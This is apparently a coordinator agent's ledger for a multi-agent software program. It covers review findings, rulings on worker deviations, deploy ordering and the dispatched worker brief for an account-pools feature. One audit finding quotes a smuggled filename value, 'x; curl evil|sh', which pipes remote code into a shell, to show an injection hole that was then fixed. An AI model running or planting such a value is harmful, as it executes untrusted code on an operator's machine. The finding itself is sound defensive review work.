  ping-pong and need a line drawn somewhere. Red CI is a GATE — binary, and part of DONE by this program's own
  brief. "Done with residuals" plus a red check is not a coherent state, and surfacing a blocker as an opinion
  would have been the error.

- **Wave 2a review (coordinator, 2026-09-06 21:44 UTC): three lenses, MERGE-WITH-FIXES, one round.** Fleet safety — the lens
  that governs an agent-first deploy — returned **MERGE, no Critical**, having compared every `ccd/ccd`
  function body against base (5 new, 0 removed, 3 changed), confirmed placement is byte-for-byte unchanged on
  an untagged box, confirmed `cmd_supervise` and both swap paths are byte-identical so nothing new runs on the
  5-second tick, and exercised the reader against 24 filesystem states without a hang or a die. **Six
  must-fix, and the first is the one that mattered.**
  **The reader has NO SIZE GATE, in the function whose headline contract is that it never blocks.** `read -r
  -d '' v` has a TYPE gate and no size bound, so the whole file lands in a shell variable. I measured 10 MB at
  0.20 s / 32 MB RSS, linear; the lens measured 100 MB at 39 s / 979 MB RSS. Reachable with no exotic
  filesystem — `ln -s ~/.cc-sessions/swap.log pools/<p>`, or this branch's OWN documented alias, after which
  every swap.log append grows the tag. The wave hardened this function against blocking on FIFOs and devices
  and left it reading an unbounded regular file. **Fixed here, not deferred to 2b, because 2b puts it on the
  5-second supervisor tick** and shipping it would leave the live fleet carrying a known stall. One token,
  measured: `-n 64` gives 0.00 s, keeps NUL detection (rc 0), reads a legal tag clean, and answers an over-cap
  file `malformed`.
  Also: the doctor interpolates an unvalidated filename into a copy-pasteable remedy (`x; curl evil|sh`); the
  D-1848 scan cannot see HYPHENATED function names and the doctor already has one, so a future
  `_check_pools-parent()` walks past the guard; the scan's per-file floor is satisfied by ONE function, so two
  call sites are covered by nothing; the `-L` pairing is satisfiable by an inert token and the reader exemption
  matches a mention inside a quoted string; and the `start`/`enable` skew pins assert only a nonzero exit while
  their titles name a mechanism — fixture-shaped guarantees inside the pins written to fix fixture-shaped
  guarantees.
  **REFUTED before forwarding:** a lens called `[[ -d "$POOLS_DIR" ]]` a live instance of the class. It is not
  — the `-e`/`-L` pair runs first, so the `-d` only ever sees a path known to exist. What survives is that the
  MECHANISM enforces `-e` while the function's own comment names the same blind spot for `-d`: the header must
  widen or stop claiming. **Third time this program has found that shape inside a disclosure.**

- **MY THIRD FALSE CLAIM, and the worker caught it (2026-09-07 01:39 UTC).** I wrote "it stalls `ws-add` under its flock" into
  the size-gate finding; the worker propagated it into `ccd/ccd`'s production comment, a test comment and a
  ledger entry without measuring it. **Measured FALSE, and I re-verified it myself:** the ws-add lock opens at
  `ccd/ccd:4055` (`exec {lfd}>>"$addlock"`), and both reader call sites are at `:3859` and `:4007` — BEFORE it.
  The reader delays one workspace creation and extends no lock hold. The supervisor-tick argument was always
  sufficient alone, which is what should have carried the finding.
  **The pattern in me is now measured three times** (D-1798's wrong lock, the two-dot diff that appeared to
  show `session-hook.sh` changing, this): I assert a mechanism from a plausible reading rather than a
  measurement, in mails that tell the worker not to. The worker's corollary is the one to keep: **a claim
  inherited from a REVIEW is not measured merely because a reviewer measured something nearby.** My 10 MB and
  100 MB figures were right; the flock clause travelling beside them was not, and it reached three files on
  the strength of the company it kept. **Carried to every remaining brief.**
- **The worker ALLOCATED FOUR NUMBERS ITSELF (D-1850–D-1853) rather than using the `D-TBD` + request route,
  self-reported it, and offered reversal (2026-09-07 01:39 UTC).** Its reasoning: `dtbd.test.ts` reds the tree on a concrete
  placeholder, so the brief's route meant pushing a branch whose CI could not go green until I woke — while
  the same review demanded green CI and a fresh fingerprint.
  **Ruling: the numbers STAND; the reasoning is REJECTED; the rule STANDS; the tension is MINE.** Verified:
  contiguous, attributed to `ccrc-pwa-clear-meadow`, defined in the same act, floor 1854, nothing unissued —
  so reversing would burn four numbers for no gain. But the claimed deadlock is not one: the `D-TBD` route ran
  six times already this program and costs a round trip, not a block. Coordinator clause 10 ("a worker never
  calls the allocator mid-wave") is a PINNED contract clause and is not mine to repeal by ruling.
  **What is genuinely wrong is my brief:** in a FINAL fix round, demanding green CI and a fresh fingerprint
  while requiring a placeholder that reds CI puts the worker between two of my own instructions. Wave 2b's
  brief states the resolution explicitly. **And a finding for whoever next revises the skill corpus:** clause
  10 presumes the run-open BLOCK model, which this program abandoned for execution-time deviations at open —
  so the clause and this program's own protocol are in tension by construction, not by anyone's error.
- **Wave 2a fix round 7 (2026-09-07 01:39 UTC):** all six must-fix and both folds landed. The worker's own verification stage —
  three implementers, three verifiers, each required to REPRODUCE rather than read — found FOUR more false
  claims, THREE written by that very round, including a `pool-name-parity` guard that counted only column-zero
  `name() {` and left a second `_ws_project_valid` in three loose spellings GREEN at 16/16 while bash honoured
  the LAST definition, on `cmd_project_pool`'s only path-containment gate. **New carry:** spec §5.4.6
  enumerates SIX verdict classes and there are now seven (`pools-unenumerable`); the worker did NOT edit the
  spec, citing D-1669 — a worker rewriting the authority to match its own deviation is what the ledger exists
  to prevent. **Wave 5 owns it.**

- **Scoped re-review of fix round 7 (2026-09-07 01:51 UTC): all six must-fix and both folds ADDRESSED**, each verified by
  reproduction rather than reading — the size gate measured at the 63/64-byte edge, the pairing rewritten to
  same-statement, the quoted-mention exemption hole closed without breaking real defers, both skew pins now
  asserting their own stderr sentence. **One new defect blocks the deploy, and it is the wave's own rule.**
  The new closing PASS says `accounts.sh could not be read` whenever `known` is empty — but `known` is empty
  in TWO conditions: the file being unreadable, and the file reading perfectly with NO ACCOUNT TAGGED (every
  `_ccrc_pool` returns empty). **The second is every box on the fleet today**, so on deploy the doctor tells
  every operator that a file it read fine could not be read. `[ -r … ]` at :2776 had already established
  readability and the code discards that distinction and re-infers it from an empty result. **This is the
  overloaded-null rule, in the fix written for the false-PASS class** — D-1744 folded `unreadable` into a
  benign state; this folds a benign state into `unreadable`. Same seam, opposite direction. **Fourth time this
  program has found its defining defect inside a disclosure written to prevent it.** Three states are needed,
  and the middle one is not UNMEASURED: the vocabulary half IS measured and the answer is "this roster carries
  no pools".
  **PROCESS RULING, on my authority and ledgered as a deliberate deviation:** the execution skill allows ONE
  fix wave after the final review and this is a second. Overruled. The cap exists to stop ping-pong on
  judgement calls; this is neither a judgement call nor a residual to surface — it is a falsehood the fix wave
  itself introduced, one line, in the surface an operator consults once they have stopped trusting everything
  else. Scope bounded to that plus a text list; **no further re-review** — I verify the predicate myself.
  Cost if wrong: one extra round on a branch that was otherwise ready.
  **The text list is its own lesson:** the anchors in the round's NEW text (`_check_graphify-path` :3382 not
  :3306, `_ws_project_valid` ccd:3717 not :3685, five flock anchors 8-11 short matching neither head nor base)
  were wrong WHEN WRITTEN, not staled by anyone. That is the worker's own 1,220-anchor argument arriving inside
  its own round, and why its instinct to replace anchors with greppable NAMES was right. Applied here rather
  than correcting the numbers.

- **Wave 2a CLOSES (coordinator, 2026-09-07 03:20 UTC).** Eight fix rounds after the worker's own five, PR #59
  merged as `58ef97b6` under a hand-written 62-line squash body (the wave's commit subjects again carried
  superseded `D-TBD-` slugs, and `dtbd.test.ts` scans file CONTENTS, not messages, so CI was green either
  way — the second wave in a row where the default body would have landed placeholders on `main`).
  **Deployed AGENT LANE FIRST**, which is the rule this wave existed to respect: the fleet host took the new
  `ccd` before the server took the code that reads what it writes, and all 16 `claude-session@*` units were
  verified active after `install_atomic`. Then the server; `/health` and `ccd --version` report the same sha.
  Three live read-only confirmations, none of them a mutation: `ccd caps` now lists `pools-v1`, `project-pool`
  appears in the usage line, and `ccrc doctor` prints `PASS pools: no project pools tagged (…/pools does not
  exist) — every project is unconstrained, which is the pre-pools behaviour`. That last line is the one the
  round-8 fix bought: before it, this exact box — readable roster, zero tags — printed a false "could not be
  read". Four filesystem states now resolve correctly (readable-and-empty, readable-with-pools, unreadable,
  absent), and the fix carries the OUTCOME beside the content rather than re-inferring it, because an empty
  result and a failed read are the same empty string by construction and no sharper test on that one variable
  could ever separate them.
- **One worker claim I could not reproduce, carried to wave 2b rather than reopened (2026-09-07 03:25 UTC).**
  The round-8 fix's own comment calls the `|| :` after `_ccrc_pool "$a"` load-bearing, saying that without it
  a readable-but-pool-less roster would report `unmeasured`. On bash 5.2, with the shape `shared/generate.mjs`
  actually emits, `_ccrc_pool` returns 0 for an untagged account — an empty `case` and a non-matching `case`
  both do — so the guard is a harmless net, not the thing holding the third state up. The third state is held
  by the `measured` sentinel line, which is unconditional. **Ruling: do not reopen a green branch for a comment
  about a defensive net**, having just overruled the one-fix-wave cap for a genuine falsehood one round earlier
  — the cost of a ninth round is not worth a word. It goes to wave 2b as a text item with my measurement
  attached: the worker either exhibits the shape where `|| :` fires, or softens the comment to say what it is.
  Cost if wrong: one sentence in a shipped comment overstates a guard's importance for one wave.

- **D-1798's wrong claim had a SECOND HOME, and my brief undercounted its pins (2026-09-07 09:30 UTC, on the
  wave 2b worker's pre-flight).** Two corrections to my own record, both measured before answering.
  (1) **The wave 2b PLAN carries the same false claim, independently.** Its Task 5 dictates a comment saying
  the flag is "rejected by `_is_valid_wrapper` as a second lock on the target slot". The plan is dated
  2026-09-05; the D-1798 measurement is 2026-09-06 — so this is not an inheritance from mail 236, it is the
  same wrong belief written down a day EARLIER. The belief was in me before the measurement that appeared to
  produce it, which is a different and worse fault than propagating a bad measurement: it means the
  measurement was read as confirmation. D-1798's entry named the mail and the test pins; it did not name the
  plan, so the correction would have shipped into `ccd/ccd` as production prose one wave later. The worker
  caught it at pre-flight and is writing the invariant instead — after the strip loop runs, NO lock sees the
  flag, so the strip loop is the only guard and must not move below the positional reads.
  (2) **My wave 2b brief said "two routes, both pinned"; there are FOUR cases across THREE verbs**
  (`server/test/ccd-project-pool.test.ts:1000-1104` on `origin/main`: `swap` twice, `start` once, `enable`
  once), and their mechanisms differ per verb — on `start`, `$# -ge 2` puts the flag in the `wrapper` slot and
  `_is_valid_wrapper` genuinely does refuse it. The entry above scopes its correction properly ("on the swap
  arm"); the BRIEF dropped the scope and flattened three verbs into one sentence. The shipped test's own
  header already says "which check fires depends on the verb and is measured per case below" — the artefact
  was honest and my restatement of it was not.
  **This is the third measured instance of one pattern in me: a correction that over-generalises from the one
  arm I measured.** D-1798's original claim, the flock clause, and now the brief's pin count. The rule the
  briefs already carry (FILE/TIME/PLATFORM) is not enough on its own; the missing half is that **a correction
  needs its own scope measured, exactly like the claim it replaces.** Carried into every later brief.
  Also recorded, because the worker will hit it: the `enable` pin is a trap — its assertions pass BECAUSE
  `_id "--cross-pool" demo` computes the bogus id `--cross-pool-demo` and writes one lifecycle line BEFORE
  failing, so Task 6 must replace that pin with the new ordering rather than delete it. And `prefer` is
  unpinned ON PURPOSE (no `CCD_ARGV` builder, no whitelist entry); giving it the flag as a shell verb does
  not make it wire-reachable, so no wire pin may be added for it.
- **Rulings on the wave 2b pre-flight (2026-09-07 09:30 UTC).** The worker found six cross-task conflicts,
  four of them in my brief or the plan. Accepted: measuring Task 3's mutation row at Task 6 (a table that
  cannot execute where it is written is a plan defect), **on condition** the deferral is recorded AT Task 3
  and Task 6's measurement is a wave gate rather than a ledger footnote — a guard whose red is proven three
  tasks later is fine, one nobody is scheduled to prove is what D-1741 was. **Overruled: folding obligation 3
  (the obligation tense) into Task 7.** It is a writing default for every implementer in every task, not a
  deliverable; a late sweep catches the comments it reads, the default stops them being written, and wave 2a
  measured the sweep alone losing to volume at a cost of four rounds. A Task 7 sweep as well, never instead.
  **Ruled to be DEVIATIONS and sent back for the batch:** the unrunnable mutation row (D-1741's class, a guard
  that would have shipped unproven) and the plan's false dictated comment (D-1742's class exactly). Neither is
  a mere ruling — a finding closed on a ruling and never numbered is the one failure mode this ledger exists
  to prevent, and the worker's own good rulings were about to swallow both.
  **Item 9 is answered and CLOSED both ways:** the worker could not exhibit a shape where `|| :` fires either,
  measured on bash 5.2.21, and quotes `shared/generate.mjs`'s own docstring saying an empty `case … esac`
  answers rc 0. The comment is being softened, with one boundary I imposed: it must name a hand-written
  `accounts.sh` as OUT OF CONTRACT rather than assert that shape exists, or it trades one unmeasured claim for
  another one level down — a bash measurement is not evidence about which files exist.

- **The wave 2b wire-vocabulary breach, and three errors of mine inside the ruling on it (2026-09-07
  14:24–15:23 UTC).** The worker raised it mid-wave rather than at wave-done, correctly: `ccd` had
  begun journalling `meas.home`, `meas.pool` and `meas.reason` on the `rehome` row against a
  `LifecycleMeas` that declared 25 keys, so `ccd-lifecycle-contain.test.ts:172` was red with
  `an unlisted meas key: expected [ 'home', 'pool', 'reason' ] to deeply equal []`. Attribution
  measured independently: all three arrived in Task 3 (`ce852626`); `origin/main`'s `ccd` emits none;
  the guard file itself is byte-identical at both refs, so nothing changed under it.
  **The warrant is the spec, not the plan** — §5.5.4 step 1 dictates the call verbatim, keys included,
  so "stop emitting" was never available; and the closed twenty-five is a RULING whose own stated
  reason ("silently DROPPED from the mirror's typed shape") is the reason it must widen when `ccd`
  gains an emitter. It has widened twice before, each time in the wave that supplied the emitter.
  The worker argued from "the plan mandates it", which a self-contradictory plan cannot settle.
  **The scope in the worker's mail was wrong, and I measured the parts it could not see.**
  `reviveMeas` (`server/src/coord/journalparse.ts`) returns a literal annotated `LifecycleMeas`, so
  three new required members are a TS2739 — declaring the keys is impossible without editing SERVER
  SOURCE, which its mail never conceded. `lifecycle-wire.test.ts` fails twice more (a hand-written
  25-name `toEqual`, an all-null 25-key literal) and was absent from its list entirely. Its "two
  'exactly 25' literals" was one executable literal plus fourteen prose sites. And the arm it handed
  to a reviewer was the worse one: `dec.crosspool` was emitted, undeclared on `LifecycleDec`, dropped
  by `reviveDec`, and **guarded by nothing at all** — no `LIFECYCLE_DEC_KEY_MAP`, no dec-key scan
  anywhere in the tree — which is why the branch was red on meas and green on dec while both were
  broken. Task 8's gate would have passed it.
  **What landed, measured at the tip rather than taken from a commit message.** `dcdb1e4b` (15:00:42)
  and `114ea60d` (15:14:45): MEAS 28 declared / 28 emitted / none unlisted / none declared-but-
  unemitted; DEC 4 / 4 / none. `reviveMeas` +3 and `reviveDec` +1, read with `s()` and the reason
  stated. A new `LIFECYCLE_DEC_KEY_MAP` with a derived `LIFECYCLE_DEC_KEYS` and the dec-key scan the
  tree did not have — the mechanism shipped in the same commit as the class it catches, which is what
  D-1848 asks of a class number. Both falsified `ccd/ccd` comments gone. The worker closed all of it
  inside an hour and UNDER-described its own scope in the mail; the standing instruction is now to
  judge the commit, not the mail.
  **The fix ships the mirror image of the defect it closes.** The new `crosspool` docstring says
  "Three writers … `cmd_swap --cross-pool`'s success tail, `cmd_start --cross-pool`'s creation-only
  marker, and `cmd_prefer --cross-pool`'s marker", and its act list reads "swap/start/rehome".
  Measured: `dec.crosspool` has exactly TWO emit sites (`cmd_swap`, `cmd_prefer`); `_crosspool_mark`
  has three CALL SITES, and `cmd_start`'s writes the registry marker only, so no `start` row ever
  carries the key. The docstring enumerates the registry writer's call sites as the journal key's
  emitters, and **its own cited grep is what produces the wrong answer** — D-1798's shape exactly,
  in the interface that is the single source, with two further homes (the guard's own new comment and
  the commit message). Third false-provenance claim measured in this wave's own texts.
  **Three errors of mine, all inside the ruling.** (1) I told the worker the sentence it quoted was
  "not in the plan". It is — plan line 7, the Architecture paragraph, verbatim; the worker had
  misattributed it to Global Constraints and spliced line 23 onto it. I searched one section and
  spoke about the file, inside a mail whose subject was that exact failure. (2) I endorsed its
  "extend `journalparse.test.ts`'s round-trip fixture" without checking; the assertion derives from
  `LIFECYCLE_MEAS_KEYS`, so the fixture needed no edit and was correctly left alone — I relayed a
  prescription as a requirement. (3) Both mails were measured at `ecef8cfc` and sent after the tree
  had moved twice, so half of what I demanded was already shipped and one deviation was restated
  against a tree that no longer had the defect. The first is the fourth measured instance of the
  scope pattern; the second is the first measured instance of the coordinator breaking the very
  obligation its own brief carries as item 7; the third is new and is now a carried constraint.
- **Deploy ruling: wave 2b inverts AGENT-FIRST — the SERVER lane ships first.** Agent-first exists
  because the server reads what `ccd` writes, and wave 2a needed it. 2b's server change is a READER
  WIDENING, and L0's own shipped doctrine settles the order: "a reader tolerating a key the writer
  does not yet produce is fine, the reverse is the defect this widening fixes". Measured:
  `ingestJournal` binds `JSON.stringify(r.meas)`, so `measJson` stores the REVIVED object, and the
  read re-revives from `measJson` and never from `raw`. A `rehome` row landing between an agent-first
  deploy and the server deploy loses home/pool/reason from the typed mirror PERMANENTLY — recoverable
  only by hand from `raw`, which nothing in this tree does. Nothing in 2b's server change depends on
  the new `ccd`, and wave 2a already shipped `pools-v1`, so server-first is lossless in both
  directions while agent-first is lossy in one. No rows are affected today: `origin/main`'s `ccd`
  emits none of the three, measured. The plan's Task 8 step 7 states the opposite AND rests on a
  false premise ("changes `ccd/` only") — the worker corrects the premise, I own the order.
  Wave 5 inherits the rule as written: agent-first is a rule about who READS whom, not about which
  directory changed, and a wave whose server arm is a reader widening deploys server-first.

- **Wave 2b's execution block MINTED: 1868–1895, 28 numbers, one contiguous call (2026-09-07
  16:40 UTC).** Floor 1868 → 1896. The worker batched TWENTY-SEVEN before Task 8's gate exactly as
  brief item 8 requires, each written in full in the plan's own `## Deviations found` under "Found
  during execution", in a commit (`95eb8aa7`) that deliberately REDS `dtbd.test.ts` so the branch
  cannot go green until the numbers are substituted. Verified before minting rather than taken from
  the mail: 27 entry headers, 27 unique slugs, count exact. **The mapping was mailed BY SLUG, not by
  ordinal** — the worker's list called itself plan-order and is alphabetical, so a positional map
  would have mis-numbered twenty-four of them.
  **The band is NOT contiguous with wave 2a's.** 1854–1867 belong to `ccrc-pwa-plain-hollow`'s
  "account connections wave 1 (fleet box): roster model" — fourteen numbers, no open run row (only
  runs 31 and 34 are open). Wave 2a ended at 1853; account-pools resumes at 1868.
  **The twenty-eighth is the fix's own false claim, and it is why the count is 28 and not 27.**
  `1895-crosspool-writers-overclaimed`: the commit that closed the `dec.crosspool` breach shipped
  a new false declaration in the same interface. `shared/api.ts:5065-5067` says "Three writers …
  `cmd_swap --cross-pool`'s success tail, `cmd_start --cross-pool`'s creation-only marker, and
  `cmd_prefer --cross-pool`'s marker"; measured, `dec.crosspool` has exactly TWO emit sites
  (ccd:14287, ccd:14351) while `_crosspool_mark` has three CALL SITES, and `cmd_start`'s writes the
  registry marker only — so no `start` row ever carries the key, and :5055's act list
  "swap/start/rehome" is false the same way. **Its own cited grep is what produces the wrong
  answer**, which is D-1798's shape exactly, in the file that is the single source. The worker had
  this finding from me an hour earlier and did not write it up; rather than let it close as a ruling,
  the number was minted WITH the finding and the worker writes the prose. It had already fixed the
  twin in `ccd-lifecycle-contain.test.ts` (measured: gone), so only the L0 half was live.
  **THREE EXTENDS, no new numbers, on D-1847's extend-not-split** — each site shares its entry's
  cause, and the rule applied is: one number per distinct MECHANISM, extend when the site shares the
  entry's cause. `meas.from`'s docstring (false for the new act, and its `ccd:11055` ref stale twice
  over — `cmd_swap` is at ccd:14058) is a second site of **1880**, same cause: the wave gave
  `rehome` an emitter and falsified L0's prose about it. Plan line 1974's "changes `ccd/` only, so it
  is agent-first" is a second site of **1890**, same cause: the plan encoded ccd-only in its Global
  Constraint AND in that premise. And **1874 was retitled off "wave2a"** — `_crosspool_valid`'s
  header and `ccd-crosspool.test.ts`'s header were falsified by this wave's own later tasks, not by
  wave 2a, so the entry is "comment claims this wave falsified", eight sites, two origins, one
  number and a title that stops lying.
  **1887 (the deploy-window banner) ACCEPTED, veto declined.** Read the fix rather than the
  summary: the cause arm at ccd:13942 REPLACES the pool census instead of adding to it, both floors
  and the marker debounce are untouched, and the cause string leads with the measured fact
  ("refused as a cross-pool crossing nobody asked for") and hedges the inference ("**likely** a
  supervisor still running a pre-deploy ccd"). That is the correct tense for a claim nothing
  measured. **1877 is left OPEN on purpose** — its own entry says UNDER REVIEW, and a number parked
  on an open review is required to resolve before wave-done, not at it.
  **A method slip of mine, caught before it reached the mail.** Checking whether a concurrent program
  was editing the roster model, `git diff origin/main..<branch>` reported five branches "touching"
  `shared/roster.ts`; three-dot `origin/main...<branch>` shows ZERO added lines on every one — the
  two-dot form was showing main's own commits back at me because those branches are behind. Same
  class as 1885: a measurement whose form cannot distinguish the thing being asked about.
  **WHY EVERY NUMBER IN THIS ENTRY IS SPELLED PREFIX-LESS.** `deviation-refs.test.ts`'s floor scan
  runs over the WHOLE tracked tree while its high-water reads definition-shaped lines in
  `docs/superpowers/plans/*.md` ONLY, and its assertion is `scan.floor === definedMax() + GAP`. The
  entries defining 1868-1895 live on `ws/clear-meadow`, unmerged, so a contiguous `D-` token for any
  of them in THIS branch's ledger reds the suite — the guard's own comment says so: "a source ref to
  an allocated-but-unentered number reds here until its entry lands". The documented spelling for a
  non-definition mention is prefix-less, and these become full refs when the wave merges. This is
  the same red the wave 2a close walked into from the other side (the ledger three commits behind
  main), and it is now a standing pre-commit check, not a lesson.

- **Inbound from another program: PR #61 changes what one wave 2b assertion MEANS (2026-09-07 18:50
  UTC, peer mail from `claude-OpenClawHetzner`, reply 263).** #61 ("an enabled non-home-able lane
  rejoins the auto-swap rotation") widens `_default_pool` from `CCRC_HOME_ABLE` alone to that plus
  every rostered non-home-able account passing `_account_ok`. Re-measured rather than taken: `gpt` is
  the ONLY `homeAble: false` account in `DEFAULT_TEST_ROSTER`, and `claude-d` — the other untagged
  one — is `homeAble: true` and therefore already in `CCRC_HOME_ABLE`, so the widening adds nothing
  for it. **The second arm I went looking for does not exist and the peer's scoping to `gpt` was
  right.** No fixture collision either: none of wave 2b's three new suites references
  `leastLoaded.ts`, which #61 also edits.
  **The peer called it a one-line wording fix; it is not, and that is the finding.**
  `ccd-auto-swap-pool.test.ts:139` asserts `_strand_why` never names `gpt`, labelled "gpt is not
  home-able: it was never a candidate". Today that holds BY HOME-ABILITY and would hold with `gpt`
  installed. After #61 it holds only because the harness never installs it — `_strand_why` walks
  `_pool_for`, and an installed non-home-able lane is in the widened default pool. So the case would
  pass on an incidental property of the fixture rather than the property its label names: **the exact
  class this wave minted seven numbers for.** Re-labelling it to "not installed in this harness"
  records the incidental reason accurately and leaves the guard measuring nothing.
  **Ruling owed, and it is #61's to make: may `_strand_why` name an installed overflow lane?** Yes →
  the wave 2b case installs `gpt` and asserts it IS named, and spec §5.8's strand vocabulary gains a
  line. No → `_strand_why` needs an explicit home-able filter and the case installs `gpt` and keeps
  asserting absence, which is the only shape that measures its own claim in BOTH worlds.
  **Nothing changes on `ws/clear-meadow` yet, deliberately.** #61 is OPEN and `origin/main` is still
  `58ef97b6`, so that assertion is TRUE today; rewriting it on an unmerged PR's premise would put a
  false claim into a shipped test, which is the defect this wave has spent the day paying for.
  **Whoever rebases SECOND owns it** — merge shas to be exchanged either way.

## Carried constraints

- Fixture pool names are `pool-a`, `pool-b` (`pool-ab` once, wave 1 Task 5) — never a real pool or account
  name in any tracked file. `topology-clean` and `single-definition` scan the whole tracked tree.
- `FLEET_PROTO` stays 1; every new field is additive with ONE reader; older-peer omission tolerated.
- No overloaded null at a seam: `unreadable` / `malformed` / `untagged` stay distinct everywhere.
- `EXEC_COMMANDS = ['tmux','ccd']` stays closed; no `gh` grant, ever.
- L0 `shared/*.ts` imports nothing (not even `node:*` types); `shared/poolrule.ts` imports only types from `./api.js`.
- Every guard ships with a test measured RED on its deletion — before and after, not asserted.
- **A correction needs its own scope measured, exactly like the claim it replaces** — FOUR
  measured instances of the coordinator generalising from the one arm it measured (D-1798's
  original claim, the flock clause, the wave 2b brief's pin count, and telling the worker a sentence
  was "not in the plan" after searching one section of it). Carry into every brief.
- **A coordinator relaying a worker's quote has not measured it** — brief item 7 binds the chair too.
  Measured once: the wave 2b worker misattributed and spliced a Global Constraint, and I reasoned
  from its rendering, then enforced item 7 against it in the same mail. Open the file the quote
  names before a ruling rests on it.
- **Re-measure the worker's tree at the moment of the reply, not at the moment the measurement
  started** — a ruling built on a dossier taken 25 minutes earlier ships a correction whose own scope
  is stale. Measured once, on this wave: two mails went out against `ecef8cfc` while the worker had
  already landed `dcdb1e4b` and `114ea60d`, so half the demands were satisfied work and one deviation
  was restated against a tree that no longer carried the defect. `git rev-parse <worker branch>`
  immediately before sending, every time.
- **Before committing anything to this ledger, check the highest contiguous `D-` token in it against
  the highest DEFINED number in `docs/superpowers/plans/*.md`.** `deviation-refs.test.ts` scans the
  whole tracked tree for mentions and takes its high-water from plan definition lines only, so a
  number MINTED but whose entry is still on the worker's unmerged branch reds the suite when the
  ledger names it contiguously. Spell those prefix-less until the wave merges. Hit from both
  directions now: the wave 2a close (ledger three commits behind main) and the wave 2b mint.
- **AGENT-FIRST is a rule about who READS whom, not about which directory changed.** A wave whose
  server arm is a reader widening deploys SERVER-FIRST: a reader ahead of its writer is safe, a
  writer ahead of its reader loses rows at ingest for good. Wave 2b is the measured case.

## Next-wave brief

**Wave 2b is dispatched as run 34** — its brief is reproduced last, below the wave-1 and wave-2a ones,
which are kept as the record of what that worker read at the time.

**Wave 1 brief, as dispatched 2026-09-05 23:46 UTC (run 32, worker `ccrc-pwa-clear-meadow`)** — the text below is what the worker read, after dispatch's own `ccrc-worker` prefix:

> Program `account-pools`, WAVE 1 of 6, run 32. You are its dispatched worker; I (`ccrc-pwa-amber-summit`) am the coordinator and I am asleep until your mail wakes me.
>
> WHAT THIS WAVE IS. The roster substrate for account pools: `AccountDef.pool` + `POOL_NAME_RE` in `shared/roster.ts`; the bare-`node` mirror `shared/roster-json.mjs` learns `pool` and closes its `hidden` gap (D-1663); `shared/generate.mjs` emits `_ccrc_pool()` into `accounts.sh` always; `shared/api.ts` gains `RosterWire.pool` and the project-pool wire vocabulary; new L0 `shared/poolrule.ts` spells the rule once (D-1664); the fixture table `server/test/fixtures/poolRule.ts`. Six tasks, Task 6 is the whole-branch gate. Nothing under `ccd/` moves — this wave is NOT agent-first and you do not deploy anything.
>
> YOUR REQUIREMENTS, in this order of authority: the wave plan `docs/superpowers/plans/2026-09-05-account-pools-wave1-roster.md` (in your tree — it was merged to `main` before you were spawned), then the spec it argues from, `docs/superpowers/specs/2026-09-04-account-pools-design.md`. The program ledger is `docs/superpowers/programs/account-pools.md`. Read the plan's Global Constraints and its Wave map once; the map tells you what later waves import from you by exact name, so do not rename anything it lists.
>
> EXECUTION SKILL: invoke `superpowers:subagent-driven-development` and run it as written — the plan's own header requires it. Fresh implementer subagent per task (Tasks 1–6), a task review after each, the fix loop bounded at five rounds, a whole-branch review at the end on the most capable model available to you, rulings ledgered in `.superpowers/sdd/<plan-basename>/progress.md`, never a stall on a question the spec answers. Model selection is yours per that skill; the plan text carries complete code for most steps, so most implementers are transcription-tier. Implementers never spawn subagents or reviewers.
>
> BRANCH: commit on THIS workspace's own branch (`ws/<your slug>` — `git rev-parse --abbrev-ref HEAD`), never a separate feature branch. When `superpowers:finishing-a-development-branch` offers its choice at the end, take "push and open a pull request" — never merge; merging is mine. Base your diff on `origin/main` (`git fetch origin` first), never a local `main`.
>
> DONE MEANS: all six tasks complete with the SDD final review clean or its residuals parked with rulings; the plan's Task 6 gates green (full server/agent/pwa suites in the FOREGROUND with timeout >= 600000 ms, `cd pwa && ./node_modules/.bin/tsc --noEmit -p tsconfig.json`, `deviation-refs` against a fetched `origin/main`, `single-definition` + `topology-clean` + `dtbd`, the five touched suites in isolation, `git diff --stat origin/main...HEAD -- ccd/ deploy/` EMPTY); branch pushed; PR opened against `main` with `gh pr create` from your shell (works there — it is the PWA-to-agent path that has no `gh` grant), title `feat(pools): wave 1 — the roster's pool field, its two mirrors, and the rule spelled once (D-1663, D-1664)`, body naming the plan by repo path and listing the rulings your SDD controller made; all four CI checks green (`test (server)`, `test (agent)`, `test (pwa)`, `build-pwa`). Then mail me `wave-done`.
>
> WAVE-DONE MAIL: `kind:"status"`, `subject:"wave-done"`, `toId:"coordinator"`, `runId` 32, body = prose plus the fingerprint as JSON exactly in this shape: `{"branchTip":"<40-hex>","prNumber":<n>,"prPhase":"open","handoffCommit":"<the same 40-hex>"}` — both shas identical, the tip you measured with `git rev-parse HEAD` after your last push. After sending it, STOP PUSHING; a new commit makes your own claim stale. Prose in that mail: commits count, suites run with counts, deviations (numbers or TBD slugs), the rulings list from your SDD ledger, anything a later wave must know that its plan cannot see.
>
> MAIL RULES SPECIFIC TO THIS PROGRAM: another program is active on this fleet, so EVERY mail you send to `coordinator` carries `"runId": 32` — the runId-less form will not resolve. A question only I can answer (a plan/spec conflict you cannot rule on, a gate that reds for a reason outside your diff) is `kind:"question"` to me with the runId; do not wait on it idle — work what does not depend on the answer. Questions for the OPERATOR ride AskUserQuestion, as your skill says; use that only for a decision neither the spec nor I can settle. Also send me one `kind:"status"` `subject:"underway"` mail once Task 1's implementer is dispatched, so I can advance the run to `working` — one line is enough.
>
> DEVIATIONS: the program's block D-1663–D-1688 is FULLY DEFINED across the six plans; this wave's two, D-1663 (Task 2) and D-1664 (Task 5), are defined in the plan's `## Deviations found` and referenced by its `LEDGER:` lines — cite them, do not redefine them. You never call the allocator. A deviation you FIND during execution: write its full entry in the plan's `## Deviations found` under `D-TBD-<short-slug>`, keep working, and mail me `kind:"status"` `subject:"deviation-request"` with the slugs and the count; I mint exactly that many and mail the numbers back (`kind:"answer"`); you substitute before `wave-done`. `dtbd.test.ts` refuses a surviving placeholder, so the PR cannot go green with one — batch the request if you can, but never invent a number and never take one from a gap.
>
> SAFETY, restated because it is cheap: tests run against FIXTURE homes only (`mkTmp`, `seedRoster`, `seedAccountsSh`, `makeCcdHarness`), never the live `$HOME`; never run any `ccd` verb against the live host; never touch tmux, `~/.cc-sessions`, `~/.cc-limits` or a `claude-session@*` unit; never print a secret file's contents; no real account, pool, host or IP anywhere — fixture pool names are `pool-a`, `pool-b`, `pool-ab`. The repo's pre-push hook refuses a blob carrying the operator's username or an absolute worktree path: write repo-relative paths in anything you commit.
>
> GRAPH: if your SessionStart card names a knowledge graph for this tree, weigh its freshness clause per your clause 12 and query it before grepping; search tools may be gated until your first `graphify query`. If the card says nothing, there is no graph here yet — proceed without one, never build one.
